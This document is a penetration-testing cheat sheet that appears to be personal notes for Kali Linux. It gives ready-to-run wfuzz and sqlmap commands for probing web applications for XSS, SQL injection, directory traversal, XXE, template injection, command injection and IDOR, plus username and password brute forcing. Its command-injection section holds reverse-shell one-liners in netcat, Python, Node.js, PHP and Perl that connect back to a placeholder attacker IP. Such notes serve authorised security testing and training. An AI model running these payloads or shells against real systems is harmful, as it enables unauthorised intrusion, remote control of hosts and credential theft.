# Testing vulnerabilities 

## Serve files from Kali
1. Create folder `mkdir payloads`
2. Add files to folder that you want to serve to target machine 
3. `cd` to the created folder 
4. Execute command to start serving the files:
```shell
python3 -m http.server 80
```

## XSS
```shell
wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt --hh 0 "$URL/index.php?id=FUZZ"
```

## SQL Injection

### Fuzzing GET parameter
```shell
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "$URL/index.php?id=FUZZ"
```

### Fuzzing POST parameter
```shell
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "id=FUZZ" -u "$URL/index.php"
```

### sqlmap GET parameter
```shell
sqlmap -u "$URL/index.php?id=1"
```

### sqlmap POST parameter
Copy POST request from Burp Suite into `post.txt` file
```shell
sqlmap -r post.txt -p parameter
```


## Directory Traversal

### Fuzzing LFI default file paths
```shell
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 0 "$URL/index.php?id=FUZZ"
```

### Fuzzing LFI app specific files
Create two wordlists:
1. Containing paths (paths.txt):
   ../
   ../../
   etc.
2. Containing custom files related to the web technology used (files.txt): 
   application.properties
   applitcation.yml
```shell
wfuzz -w paths.txt -w files.txt --hh 0 "$URL/index.php?id=FUZZFUZ2Z"
```

## XXE

### Fuzzing XXE 
Wordlist to use in Burp Suite Intruder for fuzzing XXE: `/usr/share/seclists/Fuzzing/XXE-Fuzzing.txt`

## Server-side Template Injection 

### Fuzzing SSTI 
```plaintext
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

## Command Injection 

### Fuzzing command injection 
```shell
wfuzz -c -z file,"/usr/share/payloadsallthethings/Command Injection/Intruder/command-execution-unix.txt" --sc 200 "$URL/index.php?parameter=idFUZZ"
```

### Setup reverse shell listener 
```shell
nc -nlvp 4242
```

### Reverse shell Netcat 
```shell
/bin/nc -nv [kali-ip] 4242 -e /bin/bash
```

### Reverse shell Python 
```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[kali-ip]",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Reverse shell Node.js 
```shell
echo "require('child_process').exec('nc -nv [kali-ip] 4242 -e /bin/bash')" > /var/tmp/shell.js ; node /var/tmp/shell.js
```

### Reverse shell PHP
```php
php -r '$sock=fsockopen("[kali-ip]",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("[kali-ip]",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("[kali-ip]",4242);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("[kali-ip]",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("[kali-ip]",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

### Reverse shell Perl
```shell
perl -e 'use Socket;$i="[kali-ip]";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## IDOR 

### Static file IDOR 
```shell
wfuzz -c -z range,1-100 --hc 404 "$URL/index.php?doc=FUZZ.txt"
```

### ID based IDOR 
```shell
wfuzz -c -z range,1-100 --hc 404 "$URL/index.php?doc=FUZZ"
```

## Brute forcing 

### Users discovery

```shell
wfuzz -c -z file,/usr/share/SecLists/Usernames/top-username-shortlist.txt --hc 404,403 "$URL/login.php?user=FUZZ"
```

### Password discovery
```shell
wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404,403 -d "username=admin&password=FUZZ" "$URL/login.php"
```
